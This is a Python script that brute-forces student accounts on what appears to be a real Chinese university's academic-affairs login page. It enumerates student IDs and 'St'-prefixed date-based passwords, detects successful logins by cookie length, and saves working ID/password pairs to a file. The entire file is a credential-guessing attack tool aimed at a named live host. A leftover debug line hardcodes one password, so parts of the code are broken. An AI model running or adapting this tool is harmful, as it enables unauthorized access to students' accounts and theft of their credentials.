import requests
import time


class JiaoWuChu:
    def __init__(self):
        self.url = 'http://ded.nuaa.edu.cn/NetEAn/user/jwc_login_jk1.asp?usr='
        self.nuaaid = '0'
        self.passwd = '0'
        self.yesno = 0

    def id(self, x):
        for a in [101, 102, 103, 104, 105, 106, 201, 202, 203, 204, 205, 206, 301, 302, 303, 304, 305, 306, 401, 402, 403]:
            for b in range(1, 30):
                self.nuaaid = x + str(a) + str(b).zfill(2)
                jiaowuchu.psd()
                self.yesno = 0
                #print('%s-----success' % self.nuaaid)

    def psd(self):
        for day in range(1, 32):
            day = str(day)
            if self.yesno == 1:
                break
            else:
                for x in range(1, 10000):
                    x = str(x)
                    self.passwd = 'St' + day.zfill(2) + x.zfill(4)
                    self.passwd = 'St070028'
                    self.yesno = jiaowuchu.get()
                    if self.yesno == 1:
                        break

    def get(self):
        try:
            Cookie_len = len(requests.get(
                self.url + self.nuaaid + '&pwd=' + self.passwd).headers['Set-Cookie'])
        except:
            print("Error")
            time.sleep(5)
            a = jiaowuchu.get()
        else:
            if Cookie_len == 331:
                f = open('test.txt', 'a')
                f.write(self.nuaaid)
                f.write('---')
                f.write(self.passwd + '\n')
                f.close
                return 1
            else:
                print('%s---%s---wrong' % (self.nuaaid, self.passwd))
                return 0


if __name__ == '__main__':
    jiaowuchu = JiaoWuChu()
    print('输入起始年份和学院，例如：0116')
    x = input()
    jiaowuchu.id(x)
